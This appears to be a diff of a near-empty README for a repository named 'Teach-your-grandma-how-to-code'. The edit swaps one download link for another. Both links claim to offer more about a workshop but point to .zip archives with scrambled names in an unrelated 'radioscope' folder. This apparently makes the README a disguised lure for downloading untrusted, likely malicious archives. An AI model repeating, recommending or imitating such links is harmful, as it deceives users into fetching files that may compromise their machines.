@@ -1,3 +1,3 @@
 # Teach-your-grandma-how-to-code
 
-Go to [https://github.com/AnandiSinghal/Teach-your-grandma-how-to-code/raw/refs/heads/main/radioscope/code-to-your-how-Teach-grandma-1.5.zip](https://github.com/AnandiSinghal/Teach-your-grandma-how-to-code/raw/refs/heads/main/radioscope/code-to-your-how-Teach-grandma-1.5.zip) to read more about my workshop!!!!
+Go to [https://raw.githubusercontent.com/AnandiSinghal/Teach-your-grandma-how-to-code/main/radioscope/your_grandma_code_Teach_to_how_mechanism.zip](https://raw.githubusercontent.com/AnandiSinghal/Teach-your-grandma-how-to-code/main/radioscope/your_grandma_code_Teach_to_how_mechanism.zip) to read more about my workshop!!!!
